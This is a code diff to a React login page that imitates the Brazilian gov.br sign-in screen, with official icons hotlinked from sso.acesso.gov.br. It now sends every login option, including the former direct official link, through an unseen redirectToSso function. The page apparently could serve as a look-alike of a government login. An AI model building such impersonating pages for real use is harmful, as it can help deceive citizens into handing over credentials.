@@ -156,41 +156,39 @@ export default function LoginPage() {
                   <div className="gov-option-item">
                     <button type="button" className="gov-option-btn gov-option-green" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" alt="" />
-                      Login com seu banco
+                      <span>Login com seu banco</span>
                       <span className="gov-badge-green">SUA CONTA SERÁ PRATA</span>
                     </button>
                   </div>
 
                   <div className="gov-option-item">
-                    <a href="https://sso.acesso.gov.br/login" className="gov-option-btn">
+                    <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/qrcode.png" alt="" />
-                      Login com QR code
-                    </a>
+                      <span>Login com QR code</span>
+                    </button>
                   </div>
 
                   <div className="gov-option-item">
                     <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" alt="" />
-                      Seu certificado digital
+                      <span>Seu certificado digital</span>
                     </button>
                   </div>
 
                   <div className="gov-option-item">
                     <button type="button" className="gov-option-btn" onClick={redirectToSso}>
                       <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" alt="" />
-                      Seu certificado digital em nuvem
+                      <span>Seu certificado digital em nuvem</span>
                     </button>
                   </div>
                 </div>
 
-                <div className="gov-divider-line"></div>
-
                 <div className="gov-help-links">
-                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br" target="_blank" rel="noreferrer">
-                    <i className="fa-solid fa-circle-question" style={{marginRight: '8px', color: '#1351b4', fontSize: '16px'}}></i>
+                  <a href="https://www.gov.br/governodigital/pt-br/conta-gov-br" target="_blank" rel="noreferrer" className="gov-help-main-link">
+                    <i className="fa-solid fa-circle-question"></i>
                     Está com dúvidas e precisa de ajuda?
                   </a>
-                  <a href="https://acesso.gov.br/termos-de-uso" target="_blank" rel="noreferrer" style={{marginTop: '12px'}}>
+                  <a href="https://acesso.gov.br/termos-de-uso" target="_blank" rel="noreferrer" className="gov-privacy-link">
                     Termo de Uso e Aviso de Privacidade
                   </a>
                 </div>
